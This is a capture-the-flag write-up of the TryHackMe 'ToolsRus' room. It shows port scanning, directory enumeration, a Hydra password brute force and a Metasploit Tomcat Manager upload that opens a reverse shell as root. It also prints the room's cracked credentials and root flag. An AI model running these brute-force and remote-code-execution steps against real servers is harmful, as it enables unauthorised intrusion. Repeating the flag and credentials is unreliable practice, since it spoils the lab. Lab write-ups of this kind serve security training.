# TryHackMe — ToolsRus

**Date:** 2026-04-11
**Platform:** TryHackMe
**Difficulty:** Easy
**Author:** [XENOS](https://github.com/obadahamed)

---

## Overview

A multi-stage attack room covering web enumeration, HTTP Basic Auth brute-forcing, Nikto scanning, and remote code execution via a misconfigured Apache Tomcat Manager. The chain ends with a root shell through Metasploit's `tomcat_mgr_upload` module.

**Attack Chain:**  
`Directory Enumeration` → `Credential Discovery` → `Hydra Brute Force` → `Tomcat RCE` → `Root Shell`

---

## Reconnaissance

### Port Scanning

```bash
nmap -sV -sC -p- <TARGET_IP>
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 |
| 80/tcp | HTTP | Apache 2.4.18 |
| 1234/tcp | HTTP | Apache Tomcat 7.0.88 |
| 8009/tcp | AJP | Apache Jserv 1.3 |

> **Note:** Port `1234` is non-standard — Tomcat is intentionally hidden here. Always scan all ports, not just the top 1000.

---

## Web Enumeration

### Directory Brute Force (Port 80)

```bash
gobuster dir \
  -u http://<TARGET_IP> \
  -w ~/wordlists/SecLists/Discovery/Web-Content/common.txt
```

**Discovered directories:**

```
/guidelines       → exposed internal note mentioning user "bob"
/index.html
/protected        → HTTP Basic Authentication required
/server-status
```

### Finding the Username

Visiting `/guidelines` revealed an internal message:

> *"Hey **bob**, did you update that TomCat server"*

**Username found:** `bob`

---

## Credential Brute Force

`/protected` requires HTTP Basic Auth. Using Hydra with `rockyou.txt`:

```bash
hydra \
  -l bob \
  -P /usr/share/wordlists/rockyou.txt \
  <TARGET_IP> \
  http-get /protected/
```

**Result:**

```
[80][http-get] host: <TARGET_IP>   login: bob   password: bubbles
```

**Credentials:** `bob:bubbles`

---

## Nikto Scan — Tomcat Manager (Port 1234)

```bash
nikto -h http://<TARGET_IP>:1234/manager/html -id bob:bubbles
```

**Key findings:**

- **Apache version:** `2.4.18`
- **Apache-Coyote version:** `1.1`
- **5 documents** found during scan

---

## Exploitation — Tomcat Manager Upload (RCE)

The Tomcat Manager interface allows authenticated users to deploy `.war` files. This is a well-known attack vector for remote code execution.

### Metasploit Module

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
```

### Configuration

```
set HttpUsername bob
set HttpPassword bubbles
set RHOSTS      <TARGET_IP>
set RPORT       1234
set TARGETURI   /manager/html
set LHOST       <YOUR_IP>
set LPORT       4444
```

### Execution

```bash
run
```

**Shell obtained as:** `root`

> This works because the Tomcat Manager has no restrictions on deploying malicious `.war` files when valid credentials are known. The module automatically crafts a reverse shell payload, packages it as a `.war`, deploys it, and triggers execution.

---

## Post-Exploitation

### Root Flag

```bash
cat /root/flag.txt
```

```
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|--------------|----------|--------|
| Information Disclosure | `/guidelines` | Username leaked |
| Weak Credentials | `/protected` | Brute-forceable password |
| Tomcat Manager Exposed | `:1234/manager/html` | Full RCE |
| Running as Root | Tomcat process | Full system compromise |

---

## Key Takeaways

- **Always scan all ports** — critical services are often placed on non-standard ports to avoid detection.
- **Internal notes and comments in web directories** are a common source of username/credential leaks.
- **Tomcat Manager should never be publicly accessible** — if it is, authenticated `.war` deployment equals full RCE.
- **Processes should never run as root** — even if an attacker gets RCE, limiting process privileges limits impact.

---

*Write-up by [XENOS](https://github.com/obadahamed) | [Portfolio](https://obadahamed.github.io)*
